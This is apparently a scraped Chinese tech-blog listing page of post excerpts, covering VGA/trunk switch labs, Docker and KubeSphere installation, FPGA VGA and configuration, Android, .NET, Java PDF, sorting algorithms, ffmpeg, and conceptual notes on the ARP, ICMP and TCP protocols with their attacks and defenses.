4、配置SW3，创建vlan10和vlan20，Ethernet0/0/2加入vlan10，Ethernet0/0/3加入vlan20
5、检查SW3的接口，确认Etherent0/0/2和Ethernet0/0/3都是Access接口，并且加入vlan10和vlan20 6、检查SW3的vlan数据库，确认vlan10和vlan20存在，并且有对应的转发接口
7、配置SW4，创建vlan20和vian30，Ethernet0/0/2加入vlan20，Ethernet0/0/3加入vlan30
8、检查SW3的接口，确认Etherent0/0/2和Ethernet0/0/3都是Access接口，并且加入vlan20和vlan30
9、检查SW4的vlan数据库，确认vlan20和vlan30存在，并且有对应的转发接口
10、配置SW2、SW3、SW4，将Ethernet0/0/1 配置为Trunk，允许所有vlan通过
11、检查三台交换机，确保Ethernet0/0/1是Trunk
12、配置SW1，创建vlan10、vlan20、vlan30，并将Ethernet0/0/2，Ethernet0/0/3和Ethernet0/0/4 配置为Trunk，允许所有vlan通过
13、检查接口，确认三个接口是Trunk
14、检查vlan数据库，确认有3个自定义的vlan，而且Ethernet0/0/2、Ethernet0/0/3和 Ethernet0/0/4都能转发这些vlan的数据
15、按照以下设置每个主机，并测试通信，同 一个网段的主机是可以互通的
实验三 配置和实施VLAN 实验要求： 在交换机上创建VLAN配置交换机上连接PC的端口为Access模式，并加入相应的VLAN配置交换机之间互连的端口为Trunk模式，并加入相应的VLAN 网络拓扑图： 操作步骤： 1、配置SW2，创建vlan10和vlan20，Ethernet0/0/2加入vlan10，Ethernet0/0/3加入vlan20 也可以使用vlan batch批量创建VLAN
命令：[SW3]vlan batch 10 20，创建VLAN10和 VLAN20
命令：[SW3]vlan batch 10 to 20，创建创建VLAN10到VLAN20
2、检查SW2的接口，确认Etherent0/0/2和Ethernet0/0/3都是Access接口，并且加入vlan10和vlan20 3、检查SW2的vlan数据库，确认vlan10和vlan20存在，并且有对应的转发接口 4、配置SW3，创建vlan10和vlan20，Ethernet0/0/2加入vlan10，Ethernet0/0/3加入vlan20 5、检查SW3的接口，确认Etherent0/0/2和Ethernet0/0/3都是Access接口，并且加入vlan10和vlan20 6、检查SW3的vlan数据库，确认vlan10和vlan20存在，并且有对应的转发接口 7、配置SW4，创建vlan20和vian30，Ethernet0/0/2加入vlan20，Ethernet0/0/3加入vlan30 8、检查SW3的接口，确认Etherent0/0/2和Ethernet0/0/3都是Access接口，并且加入vlan20和vlan30 9、检查SW4的vlan数据库，确认vlan20和vlan30存在，并且有对应的转发接口 10、配置SW2、SW3、SW4，将Ethernet0/0/1 配置为Trunk，允许所有vlan通过 11、检查三台交换机，确保Ethernet0/0/1是Trunk 12、配置SW1，创建vlan10、vlan20、vlan30，并将Ethernet0/0/2，Ethernet0/0/3和Ethernet0/0/4 配置为Trunk，允许所有vlan通过 13、检查接口，确认三个接口是Trunk 14、检查vlan数据库，确认有3个自定义的vlan，而且Ethernet0/0/2、Ethernet0/0/3和 Ethernet0/0/4都能转发这些vlan的数据 15、按照以下设置每个主机，并测试通信，同 一个网段的主机是可以互通的 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f06ffb96b9d72542bdf20cf6770885bb/" rel="bookmark">
			从零开始安装KubeSphere教程(学习笔记)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习KubeSphere记录下安装过程的笔记 环境信息 3台 虚拟机 centos7 2核 8G 30G硬盘 1. 安装Docker 1.1 卸载之前的docker并且安装yum工具类 sudo yum remove docker* sudo yum install -y yum-utils
1.2 配置docker的yum地址 sudo yum-config-manager \ --add-repo \ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 1.3 安装指定版本 sudo yum install -y docker-ce-20.10.7 docker-ce-cli-20.10.7 containerd.io-1.4.6
1.4 启动&amp;开机启动docker systemctl enable docker --now
1.5 docker加速配置 这里使用阿里云的镜像地址，镜像地址需要自己登陆阿里云获取。
sudo mkdir -p /etc/docker sudo tee /etc/docker/daemon.json &lt;&lt;-'EOF' { "registry-mirrors": ["此处改为自己的镜像地址"], "exec-opts": ["native.cgroupdriver=systemd"], "log-driver": "json-file", "log-opts": { "max-size": "100m" }, "storage-driver": "overlay2" } EOF sudo systemctl daemon-reload sudo systemctl restart docker 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f06ffb96b9d72542bdf20cf6770885bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3549ca3e97d883259b268b7ceffc41f6/" rel="bookmark">
			[单显卡直通求助] archlinux 显卡直通 虚机启动后黑屏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现象：虚机启动后黑屏10分钟，无法看到桌面
虚机暂未配ssh-server，无法debug，
具体配置记录如下：
0.系统信息
1. iommu信息
bios中开启vt-d后，iommu查询得下图，dmmuy host bridge, GPP bridge两项是否应存在存疑，但仍加入了/etc/modprobe.d/vfio.conf中
2. vrom信息
通过amdvbflash linux工具命令 和 TechPowerUp下载获得两个vbios.rom
sudo ./amdvbflash -s 0 vbios.rom VGA Bios Collection: XFX RX 580 8 GB | TechPowerUp
3. libvirt配置
已新建的虚机，无法删除显示协议spice，因此改为导入创建的win10磁盘镜像
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3587aea828263fd81d1b446d73417f3e/" rel="bookmark">
			Python实现简易中国剩余定理（信安密码实验）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		西电信安密码学基础实验二 实现中国剩余定理 使用Python实现
题目要求实现三个大整数下的同余方程求解X的值，若无法求得则输出不能直接使用中国剩余定理求解
源代码：
import math def exgcd(a, b): if b == 0: return 1, 0, a else: x, y, q = exgcd(b, a % b) x, y = y, (x - (a // b) * y) return x, y, q filename = (input("请输入文件路径：")) with open(filename, 'r') as f: lines =f.readlines() number = list(map(int, lines)) if math.gcd(number[3], number[4]) == 1 and \ math.gcd(number[3], number[5]) == 1 and \ math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3587aea828263fd81d1b446d73417f3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48f8830e107badbbae5bce4a641b3b9f/" rel="bookmark">
			Android实现RecyclerView嵌套流式布局
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 Android开发中，列表页面是常见需求，流式布局的标签效果也是常见需求，那么两者结合的效果啥样呢？这篇文章简单实现一下。
实现过程 添加流式布局依赖，在app/build.gradle文件中添加如下代码 implementation 'com.google.android.flexbox:flexbox:3.0.0' 新建Activity文件RecyclerViewActivity.class package com.example.androidstudy; import androidx.appcompat.app.AppCompatActivity; import androidx.recyclerview.widget.LinearLayoutManager; import androidx.recyclerview.widget.RecyclerView; import android.os.Bundle; import android.widget.Toast; import com.example.androidstudy.adapter.MyRecyclerAdapter; import com.example.androidstudy.bean.TestData; import java.util.ArrayList; import java.util.List; public class RecyclerViewActivity extends AppCompatActivity { private RecyclerView recyclerView; private MyRecyclerAdapter adapter; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_recycler_view); initViews(); initListener(); } private void initListener() { adapter.setItemCellClicker(tag -&gt; Toast.makeText(RecyclerViewActivity.this, tag, Toast.LENGTH_SHORT).show()); } private void initViews() { recyclerView = findViewById(R.id.recyclerview); // 设置布局管理器 recyclerView.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/48f8830e107badbbae5bce4a641b3b9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/703319b790a67a914ca2a6490e6eabbc/" rel="bookmark">
			Alist小雅超集Docker搭建排坑指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		win10 好用的 alist exe
参考
https://zhuanlan.zhihu.com/p/572827191
https://post.smzdm.com/p/aqm46x2p/
参考
https://www.4d4y.com/forum/viewthread.php?tid=3129452&amp;extra=page%3D1
http://www.lilin.net/blog/?p=2684
github
https://github.com/alist-org/alist/blob/main/README_cn.md
百度网盘极速下载
http://www.kinhdown.com/
找资源
https://zhaoziyuan.la/
4K电影合集 + 怀旧动画
https://www.aliyundrive.com/s/NJGTMWsgcbt
https://www.aliyundrive.com/s/B7sBGntD9pM
有时间飞船 和 机动战士高达
https://www.aliyundrive.com/s/B7sBGntD9pM/folder/633c5276b39c2a04d71f4abf8c5835584270f507
【【Alist】Alist v3 将阿里云盘他人分享链接进行挂载丨不占用自己云盘容量-哔哩哔哩】 https://b23.tv/U0r6sDV
再也不用担心阿里云盘空间不够了！！！
【安卓手机本地部署alist方案演示视频-哔哩哔哩】 https://b23.tv/pHiJmpr iOS fly ~
【通过 Termux 实现 安卓系统下本地部署 AList-哔哩哔哩】 https://b23.tv/YNDDmKZ
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15e7a53d6feed2a4203e7306ed0ccd4c/" rel="bookmark">
			SpringBoot微信小程序V3支付
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.申请商户获取参数或文件
微信小程序appid：xxxx
商户API证书私钥文件：xxxx（微信支付）
商户号：xxxx （微信支付）
商户API证书序列号：xxxx （微信支付）
商户API v2密钥：xxxx（自定义）
商户API v3密钥：xxxx（自定义）
微信平台证书文件：xxxx （自己生成或自动生成）
微信小程序开发密钥：xxxx（小程序）
平台证书不是API证书：需5年更换一次
下载jar包https://github.com/wechatpay-apiv3/CertificateDownloader
https://github.com/wechatpay-apiv3/CertificateDownloader/releases
2.application.properties配置
wechat.pay.app_id= xxxx # 微信小程序appid wechat.pay.private_key_path=xxxx.pem #商户API证书私钥文件路径 wechat.pay.merchant_id= xxxx #商户号 wechat.pay.merchant_serial_number= xxxx #商户API证书序列号 wechat.pay.api_v2_key= xxxx #商户API v2密钥 wechat.pay.api_v3_key= xxxx #商户API v3密钥 wechat.pay.wechat_certificate_path= xxxx.pem #微信平台证书文件路径 wechat.pay.app_select=xxxx #微信小程序开发密钥 wechat.pay.notify_url=https://xxxxx.com:port/succeed.atcion#支付成功回调 https开头 3.maven pom
&lt;dependency&gt; &lt;groupId&gt;com.github.wechatpay-apiv3&lt;/groupId&gt; &lt;artifactId&gt;wechatpay-apache-httpclient&lt;/artifactId&gt; &lt;version&gt;0.4.8&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-httpclient&lt;/groupId&gt; &lt;artifactId&gt;commons-httpclient&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt; 4.微信支付属性配置
package com.mt.applets.config; import com.wechat.pay.contrib.apache.httpclient.util.PemUtil; import lombok.Data; import org.springframework.beans.factory.annotation.Value; import org.springframework.context.annotation.PropertySource; import org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15e7a53d6feed2a4203e7306ed0ccd4c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/247915380e3c0d26efb6a2abf3ca7be5/" rel="bookmark">
			【FPGA】十、VGA字符显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录
前言
一、实验任务
二、字符取模
三、程序设计
总结
前言 我们在上一篇文章中已经对VGA视频传输标准作了详细的介绍，包括VGA接口协议、行/场同步时序、以及显示分辨率等，也实现了基于VGA接口标准的等宽彩条的显示实验，如果对VGA的基本概念不是很熟悉的话，可以去看看VGA彩条显示这部分的内容。
在上篇文章的结尾，提高还可以利用VGA接口标准来显示其他图片、字符，在本次文章中，我们就一起来完成VGA的字符显示的内容，达到一个复习巩固的效果。
一、实验任务 本篇的实验任务就是使用VGA接口标准，在显示器的中间显示“卡布奇洛”这四个汉字。
显示模式：640*480@60
点阵大小：64*64
字符大小：56*56
二、字符取模 字符（包括汉字、字母和符号等）的本质是点阵，在VGA屏幕上体现为字符显示区域内像素点的集合。字符的大小决定了字符显示区域内像素点的数目，而字符的样式（字体、颜色等）则决定了各像素点的颜色值。因此，我们在进行字符显示之前，先要对指定的字符进行字符取模，获得该字符的点阵数据。
为了获得指定字符的点阵数据，就需要对字符进行取模处理，字模的提取可以通过字符取模软件来实现，我们这里所使用的取模软件为PCtoLCD2002来提取“卡布奇洛”这四个汉字的字模，下面就是使用PCtoLCD2002软件进行字符取模的过程。
① 双击打开PCtoLCD2002字符取模软件，将模式修改为字符模式。
② 根据显示要求修改点阵大小与字符大小，我这里点阵大小为64*64，字符大小为56*56。
③ 在点阵大小与字符大小设置完成后，我们在输入框中输入我们要生成字符的汉字，我这里输入的是“卡布奇洛”。
④ 这时就显示出了字模，但是这时不要生成字模，因为这时生成字模是单个汉字的字模，不是我们需要的整体的字模。这时我们点击另存为，保存到我们项目工程的doc文件夹下，保存的格式为.bmp格式。
⑤ 保存完成过后，在软件的文件目录下选择打开，打开刚刚保存的字模，然后打开选项进行字模的配置。
⑥ 参数设置完成后点击确定，然后点击生成字模，保存字模。
⑦ 最后就可以看到我们的doc文件夹下有生成的字模数据了。
到此为止呢我们的字模生成算是完成了，我们保存的字模的点阵大小是256*64，因为我们一个点阵是64*64，而我们有四个点阵，也就是64*4=256，所以我们的整体字模的点阵大小就是256*64。
三、程序设计 由于本次实验工程是在上一个实验工程上进行了修改，所以上一个实验工程的一些模块是可以直接进行复用的，这里主要需要更改VGA的显示模块，其余两个模块可以进行复用。
① VGA字符显示顶层模块：
/*====================================* filename : vga_char_top.v description : VGA字符显示顶层模块 time : 2022-12-29 author : 卡夫卡与海 *=====================================*/ module vga_char_top( input clk ,//系统时钟 input rst_n ,//复位 output vga_hsync ,//行同步信号 output vga_vsync ,//场同步信号 output [15:0] vga_rgb //数据输出（红绿蓝） ); //信号定义 wire vga_clk ;//vga工作时钟 25MHZ wire locked ; wire vga_reset ; wire [9:0] pix_x ; wire [9:0] pix_y ; wire [15:0] pix_data ; assign vga_reset = rst_n &amp;&amp; locked; //模块例化 //PLL CLK_PLL	CLK_PLL_inst ( .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/247915380e3c0d26efb6a2abf3ca7be5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1cef540ab4355e77b09fce07997c8cee/" rel="bookmark">
			DDDDOCR安装以及使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DDDDOCR图片验证码识别技术 在我们日常浏览网页的时候，常常会弹出一张图片让你来验证，有的是滑动验证，有的是输入相应字符来进行验证，今天我就来给大家介绍这么一个技术，可以专门用来识别图片验证码的功能。
包下载 提到包下载，我们就会想到通过命令行pip install ddddocr或者通过pycharm框架中的添加包来实现。
但是在下载这个包的过程中总是在提醒存在以下错误：
C:\Users\Test&gt;pip install ddddocr Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple Collecting ddddocr Using cached https://pypi.tuna.tsinghua.edu.cn/packages/43/f7/febabbc3580e811accf89ca5236c7de0062b07adf535edc66587ff9149cb/ddddocr-1.0.6-py3-none-any.whl (6.9 MB) Collecting numpy Using cached https://pypi.tuna.tsinghua.edu.cn/packages/73/39/f104eb30cc3da44d1e10622418c5e6eb5ac224f0f20c97dba44cf2de2af9/numpy-1.24.1-cp311-cp311-win_amd64.whl (14.8 MB) ERROR: Ignored the following versions that require a different python version: 1.0.8 Requires-Python &lt;3.8; 1.1.0 Requires-Python &lt;3.9; 1.2.0 Requires-Python &lt;3.10; 1.21.2 Requires-Python &gt;=3.7,&lt;3.11; 1.21.3 Requires-Python &gt;=3.7,&lt;3.11; 1.21.4 Requires-Python &gt;=3.7,&lt;3.11; 1.21.5 Requires-Python &gt;=3.7,&lt;3.11; 1.21.6 Requires-Python &gt;=3.7,&lt;3.11; 1.3.0 Requires-Python &lt;3.10; 1.3.1 Requires-Python &lt;3.10; 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1cef540ab4355e77b09fce07997c8cee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15c7178683b31ec0a7947c5c271f69f2/" rel="bookmark">
			ffpeg 使用：多段 mp4 视频合成一个 python 脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		将多个 mp4 文件直接拼接会使得视频偏长，原本多个视频文件加起来可能只有几秒，合并之后变为几分钟了
这里采取的策略是将 mp4 转为 ts 文件之后再合并。
记得在 outputs 上级目录执行
import os # mp4 存放地址 output = 'outputs' mp4_files = [file for file in os.listdir(output) if file.endswith('.mp4')] mp4_files.sort() # 新建一个 ts_output 文件夹，用于存放新生成的 ts 视频文件 ts_files = [] ts_output = 'ts_output' # mp4 视频转为 ts for mp4_file in mp4_files: input_file = output+'/'+mp4_file file_name = mp4_file.split(".")[0]+".ts" output_file = ts_output+'/'+file_name os.system(f'ffmpeg -i {input_file} -c:v copy {output_file}') ts_files.append(file_name) # 所有 ts 文件地址写到 list-of-files.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15c7178683b31ec0a7947c5c271f69f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b918c1035d64c33acf72de294facc88/" rel="bookmark">
			数据结构-十大经典排序算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2022.12.30发完数据结构就告一段落，22年也尽快过去，疫情也退散了，预祝各位元旦快乐！
数据结构-十大经典排序算法 冒泡排序选择排序插入排序希尔排序归并排序快速排序堆排序计数排序桶排序基数排序 冒泡排序 // // sort_.cpp // Sort // // Created by ljpc on 2018/4/20. // Copyright © 2018年 ljpc. All rights reserved. // #include "sort_.h" void print_array(int *arr, int n) // 打印数组 { if(n==0) { printf("ERROR: Array length is ZERO\n"); return; } printf("%d", arr[0]); for (int i=1; i&lt;n; i++) { printf(" %d", arr[i]); } printf("\n"); } void sort_array(int *arr, int n) // 编程实现《冒泡排序算法》：将乱序序列arr转化为升序序列 // 函数参数：乱序整数数组arr 数组长度 // 要求输出：调用print_array(int *arr, int n)输出前三次冒泡操作后的序列，以及最终的升序序列 { // 请在这里补充代码，完成本关任务 /********** Begin *********/ int i,x,j; for(j=0; j&lt;n-1; j++) { for(i=0; i&lt;n-j-1; i++) { if(arr[i]&gt;arr[i+1]) { x=arr[i]; arr[i]=arr[i+1]; arr[i+1]=x; } } if(j&lt;3) print_array(arr,n); } print_array(arr,n); /********** End **********/ } 选择排序 // // sort_.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b918c1035d64c33acf72de294facc88/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a03c60eb067722aad032cd5b4466df9c/" rel="bookmark">
			.Net Code Filter 筛选器（一）之 ActionFilter-- IAsyncActionFilter 和 ActionFilterAttribute
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		微软官网例子：Filter筛选器
使用场景（执行顺序）：
IAsyncActionFilter
使用异步actionFilter 只需要实现 他的 ：OnActionExecutionAsync 方法 （注意这里的异步不是拦截异步是指的是 当前OnActionExecutionAsync方法内执行的内容是异步的）
例如:我在这里注入两个 ActionbFliter （MyActionFilter1 和 MyActionFilter2）
注意 ： 多个Filter 执行是一个链路形式的
MyActionFilter1
public class MyActionFilter1 : IAsyncActionFilter { public async Task OnActionExecutionAsync(ActionExecutingContext context, ActionExecutionDelegate next) { Console.WriteLine("MyActionFilter 1:开始执行"); ActionExecutedContext r = await next(); //如果执行 下一个ActionFilter if (r.Exception != null) { Console.WriteLine("MyActionFilter 1:执行失败"); } else { Console.WriteLine("MyActionFilter 1:执行成功"); } } } MyActionFilter2
public class MyActionFilter2 : IAsyncActionFilter { public async Task OnActionExecutionAsync(ActionExecutingContext context, ActionExecutionDelegate next) { Console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a03c60eb067722aad032cd5b4466df9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3fd3b43b36de62083334cc39a2b624e7/" rel="bookmark">
			java生成pdf
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要在 Java 中生成 PDF 文件，可以使用一些第三方库，例如 iText、Apache PDFBox 或者 JasperReports。
iText 是一个开源的 PDF 库，可以用来生成、编辑和阅读 PDF 文件。使用 iText 生成 PDF 的基本流程如下：
创建一个 Document 对象。使用 Document 对象的 add() 方法向 PDF 中添加文本、图像和其他内容。创建一个 PdfWriter 对象，并将其与 Document 对象关联起来。使用 PdfWriter 对象的 write() 方法将 PDF 保存到文件或输出流中。 下面是一个使用 iText 生成简单 PDF 文件的示例代码：
import com.itextpdf.text.Document; import com.itextpdf.text.Paragraph; import com.itextpdf.text.pdf.PdfWriter; import java.io.FileOutputStream; public class HelloWorld { public static void main(String[] args) { try { // 创建一个 Document 对象 Document document = new Document(); // 创建一个 PdfWriter 对象，并将其与 Document 关联 PdfWriter.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3fd3b43b36de62083334cc39a2b624e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68d0e37720a99dc19e44aead2801e3eb/" rel="bookmark">
			word文件损坏打不开如何修复？文件丢失怎么办？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们日常办公中，经常用到Word文档。但是有时会遇到word文件损坏、无法打开的情况。这时该怎么办？接着往下看，小编在这里就给大家带来Word文件修复的方法，以及Word文件丢失如何恢复的方法！
一、Word文件损坏怎么办 部分用户遇到Word文档损坏，不知道该怎么操作来恢复数据。word怎么打开并修复文件？来看下面的3个修复方法：
方法1：
步骤1：新建一个Word文档，点击【文件】里面的【打开】。在打开的页面右侧找到【这台电脑】，单击【我的文档】；
步骤2：在弹出的界面，选择你要修复的Word文档，单击【打开】里面的【打开并修复】。
方法2：
步骤1：新建文档后，在页面的上方找到【插入】，点击它。选择【文本】里面的【对象】，再点击【文件中的文字】；
步骤2：在弹出的对话框，选择要恢复的文档，点击【插入】。
方法3：
步骤1：同样也是新建一个文档，在页面的菜单栏点击【文件】，再选择【选项】。在打开的页面，找到【高级】下的【常规】。选择【打开时确认文件格式转换】并点击【确定】；
步骤2：然后在菜单栏里面选择【打开】，位置就选择【这台电脑】，找到要恢复的文档即可。
二、Word文件丢失怎么办 以上就是修复Word文档的三个方法。如果在修复word文档的过程中，发现之前的文件丢失了，建议通过软件来恢复。该软件可以恢复多种文件类型（Word、Excel、PPT、TXT等），还可以恢复多种存储设备里面的数据（硬盘、移动硬盘、相机、内存卡等）。
步骤1：在打开的软件首页，选择文件要扫描的类型（为了扫描更全面，建议全选）。然后选择软件要扫描的位置（如果是外接设备，请提前与电脑连接上再选择）。最后，选择【扫描】即可。
步骤2：等待一会，快速扫描结果就会出现，如果文件扫描出来不全面，请选择【深度扫描】。这时就可以选择要恢复的文件了，可选择多个文件。选择成功，点击【恢复】，然后选择文件要保存的位置即可。
备注：恢复页面右上角有切换视图，可点击不同的切换方式来预览文件信息。
很多人遇到文件损坏的情况，不知道该怎么操作？对于word文件损坏打不开的情况，我们可以根据以上的三个方法来一一操作。文件恢复成功，记得要做好备份的工作，避免文件的再次损坏丢失。
往期推荐：
excel表格制作如何设置？新手必备教程！https://mp.csdn.net/mp_blog/creation/editor/128476541如何进行深度数据恢复？分享详细的恢复方法https://mp.csdn.net/mp_blog/creation/editor/128476334
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0e657bc190698a3c240a725e5fd2b70/" rel="bookmark">
			协议类型哈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		arp协议 netsh -c "i i" add neighbors 网卡名称 “ip地址” “mac 配置静态绑定
地址解析协议:将一个IP地址解析为MAC地址(源主机发送ARP广播报文去请求目的主机的MAC地址，目的主机收到清求报文后，进行单播响应自己的MAC地址)
二层交换网络中，相互通信使用的是物理地址交互
ARP协议报文: 封装在数据链路层的上层
硬件类型: 网络接口 (网卡) 的类型
协议类型:需要解析的IP地址的类型
硬件地址长度
协议地址长度
opcode: 操作码 (表示报文是请求 (1) 还是响应报文 (2) )
发送方的MAC地址
发送方的IP地址
接收方的MAC地址: 在ARP广播请求报文中，此地址一般为填充地址
接收方的IP地址
容易造成ARP攻击和欺骗
攻击: 发送虚假的MAC响应报文，使得目标主机无法访问网络
欺骗:发送真实的MAC响应报文，解感目标主机访问网络的流量，达到中间人攻击效果需要开启IP转发功能
研判攻击行为：研判攻击行为:主机无法上网，收到大量ARP响应报文，ARP缓存表中是否有一个IP对应了多个MAC，直接向自己的路由器发送ARP报文，根据响应的MAC地址和缓存表中MAC地址进行比对
研判欺行为:直接向自己的路由发送ARP报文，根据响应的MAC地址和缓存表中MAC地址进行比对，使用路由跟踪，查看第一跳路由器是不是自己网关
防御:在主机和路由器上进行ARP(IP-MAC)绑定，在安全设备上开启发送免费的ARP报文(只能减少攻击面)
icmp lnternet控制报文协议:在主机和路由器之间传递控制报文信息(控制报文:告诉主机网络是否可达，端口是否可达，网络通不通)主机访问不同网络时，需要将数据交给路由器去进行转发，路由器如果可以转发，直接转发，如果不能转发，会回复给主机对应的控制报文信息，当网络出现抖动时，也会产生某一些控制报文消息
报文类型
类型0: 回显应答，标准的ICMP应答报文
类型3: 目标不可达 网络不可达0
主机不可达1
协议不可达2
端口不可达3
类型5:重定向:当路由器收到一个目的为非优化路由(主机去往某个目的地，有更优的路径)时，会响应给主机一个重定向报文，告诉主机改变自己的路由
类型8: 回显请求，标准的ICMP请求报文
ping命令，就是使用的ICMP的类型8
重定向攻击。向目标主机发送重定向报文，使得目标主机改变自己的路由，可以实现中间人攻击，可以使得目标主机无法访问
网络伪造网络不可达报文，主要是去欺骗目标主机无法访问网络，但是目标主机访问网络不受影响，在ping命令上有所体现（当去ping其他主机时，会回显伪造的不可达报文）
防御：直接去主机禁用对应的lcmp报文类型
TCP协议
传输控制协议。提供的可靠的传输，点对点(单播)的传输，在传输数据之前，首先需要去建立连接，数据传输完成后，需要释放连接。TCP建立连接的三次挥手
源主机发送SYN报文去请求建立连接，会生成一个随机序号 (seg)
目标主机收到SYN报文后，会进行确认 (发送ACK报文)，在上一个报文基础上增加1，形成确认序号(ack序号)，并发送SYN
报文，生成一个新的序号 (seq)。源主机收到目标主机的SYN报文后，进行最后确认，回应ACK报文，在上一个SYN的seq序号上增加1。TCP释放连接的四次挥手
源主机发送FIN+ACK报文
目标主机收到后响应ACK报文，ACK控制位为1
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0e657bc190698a3c240a725e5fd2b70/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98a2e33f34cb71363404ca5f22c9ae2a/" rel="bookmark">
			FPGA上电时序加载过程详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文作者：FPGA设计论坛 目前，大多数FPGA芯片是基于 SRAM 的结构的， 而 SRAM 单元中的数据掉电就会丢失，因此系统上电后，必须要由配置电路将正确的配置数据加载到 SRAM 中，此后 FPGA 才能够正常的运行。
常见的配置芯片有EPCS 芯片 （EPCS4、EPCS8、EPCS16、EPCS64、EPCS128），还有通用的串行 SPI FLASH 芯片如 M25P40、 M25P16、 W25Q16 等。
配置(configuration)是对FPGA的内容进行编程的过程。每次上电后都需要进行配置是基于SRAM工艺FPGA的一个特点，也可以说是一个缺点。FPGA配置过程如下：
2.FPGA配置方式 根据FPGA在配置电路中的角色，可以将配置方式分为三类：
1.FPGA主动串行(AS)方式 2. JTAG方式 3. FPGA被动(Passive)方式
3.FPGA配置过程 FPGA的配置包括3各阶段：复位、配置和初始化。
FPGA正常上电后，当其nCONFIG管脚被拉低时，器件处于复位状态，这时所有的配置RAM内容被清空，并且所有I/O处于高阻态，FPGA的状态管脚nSTATUS和CONFIG_DONE管脚也将输出为低。当FPGA的nCONFIG管脚上出现一个从低到高的跳变以后，配置就开始了，同时芯片还会去采样配置模式（MSEL）管脚的信号状态，决定接受何种配置模式。
随之，芯片将释放漏极开路（open-drain）输出的nSTATUS管脚，使其由片外的上拉电阻拉高，这样，就表示FPGA可以接收配置数据了。在配置之前和配置过程中，FPGA的用户I/O均处于高阻态。
在接收配置数据的过程中，配置数据由DATA管脚送入，而配置时钟信号由DCLK管脚送入，配置数据在DCLK的上升沿被锁存到FPGA中，当配置数据被全部载入到FPGA中以后，FPGA上的CONF_DONE信号就会被释放，而漏极开路输出的CONF_DONE信号同样将由外部的上拉电阻拉高。因此，CONF_DONE管脚的从低到高的跳变意味着配置的完成，初始化过程的开始，而并不是芯片开始正常工作。
INIT_DONE是初始化完成的指示信号，它是FPGA中可选的信号，需要通过Quartus II工具中的设置决定是否使用该管脚。在初始化过程中，内部逻辑、内部寄存器和I/O寄存器将被初始化，I/O驱动器将被使能。
